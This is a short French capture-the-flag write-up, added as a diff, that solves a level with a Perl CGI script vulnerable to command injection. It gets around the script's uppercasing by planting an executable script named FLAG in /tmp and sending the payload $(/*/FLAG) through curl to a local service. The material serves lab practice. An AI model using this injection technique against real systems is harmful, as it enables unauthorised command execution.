@@ -1,0 +1,37 @@
+cat level12.pl
+
+
+Le script level12.pl prend deux paramètres (x et y) depuis une requête CGI.
+
+Il exécute egrep "^$xx" /tmp/xd, où xx = paramètre x.
+
+Comme xx est injecté tel quel dans une commande shell avec les backticks `...`, on peut faire une injection de commande.
+
+Idée: au lieu de donner une vraie regex à egrep, on injecte une commande (getflag) pour écrire le flag dans /tmp/flag12.
+
+On doit passer la commande 
+
+$(getflag)
+
+mais le programme la met en majuscule ce qui fait qu'elle ne sera pas executer 
+
+
+cd /tmp
+vim FLAG     
+
+```sh
+#!/bin/sh
+getflag > /tmp/flag12
+```
+
+le rendre executable
+chmod +x FLAG
+
+
+curl 'localhost:4646/?x=$(/*/FLAG)'
+
+
+Ici $(/*/FLAG) exécute le script placé dans /tmp/.
+
+
+cat /tmp/flag12
